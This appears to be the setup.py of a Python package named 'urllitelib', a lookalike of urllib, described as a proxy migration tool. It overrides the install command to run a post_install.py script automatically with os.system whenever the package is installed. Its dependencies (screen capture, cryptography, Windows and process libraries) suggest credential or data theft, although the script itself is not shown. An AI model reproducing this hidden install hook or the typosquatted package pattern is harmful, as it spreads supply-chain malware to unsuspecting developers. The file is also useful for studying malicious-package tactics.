from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        os.system('python urllitelib\\post_install.py')
    
setup(
    name='urllitelib',
    version='1.0.1',
    description='Automatic proxy migration.',
    author='Pain',
    author_email='benjaminrodriguezshhh@proton.me',
    packages=['urllitelib'],
    install_requires=[
        "requests",
        "pyautogui",
        "pycryptodome",
        "pywin32-ctypes",
        "psutil",
    ],
    cmdclass={'install': CustomInstall},
    entry_points={
        'console_scripts': [
            'mi_script = urllitelib.post_install:main'
        ]
    },
)